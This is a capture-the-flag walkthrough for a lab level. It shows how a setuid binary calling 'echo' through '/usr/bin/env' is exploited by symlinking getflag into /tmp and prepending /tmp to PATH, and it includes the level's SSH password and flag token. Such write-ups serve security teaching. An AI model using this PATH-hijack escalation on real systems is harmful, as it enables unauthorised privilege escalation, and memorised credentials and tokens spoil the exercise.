# Level 03

## Requirements

- None

## Walkthrough

1. Login from the __attacker__'s machine.

	```
	ssh -p 4242 level03@192.168.1.32
	Password: kooda2puivaav1idi4f57q8iq
	```

1. Checking files.

	```sh
	> pwd
	/home/user/level03

	> ls -laRth
	.:
	total 24K
	dr-x------ 1 level03 level03  120 Mar  5  2016 .
	-rwsr-sr-x 1 flag03  level03 8.5K Mar  5  2016 level03
	-r-x------ 1 level03 level03 3.5K Aug 30  2015 .bashrc
	d--x--x--x 1 root    users    340 Aug 30  2015 ..
	-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
	-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
	```

1. Well, `level03` is a good starting point.

	```sh
	> ./level03
	Exploit me
	```

1. Perfect! We are on the good track. Let's start with a basic string analyze.

	```sh
	> strings level03
	/lib/ld-linux.so.2
	...
	/usr/bin/env echo Exploit me
	...
	_init
	```

1. As we can see, we have a strong hint here. A call to `echo` is made through `/usr/bin/env`, we might be able to exploit this by updating our `$PATH`.

	```sh
	# Find `getflag` location
	> whereis getflag
	getflag: /bin/getflag

	# Create a symlink to getflag
	> ln -sf /bin/getflag /tmp/echo

	# Update our $PATH
	> PATH="/tmp:$PATH"
	```

1. Get the flag

	```sh
	> ./level03
	Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
	```

## Documentation

- Command: [strings](https://man7.org/linux/man-pages/man1/strings.1.html)
- Command: [ln](https://man7.org/linux/man-pages/man1/ln.1.html)
- Environment: [$PATH](https://www.digitalocean.com/community/tutorials/how-to-view-and-update-the-linux-path-environment-variable)
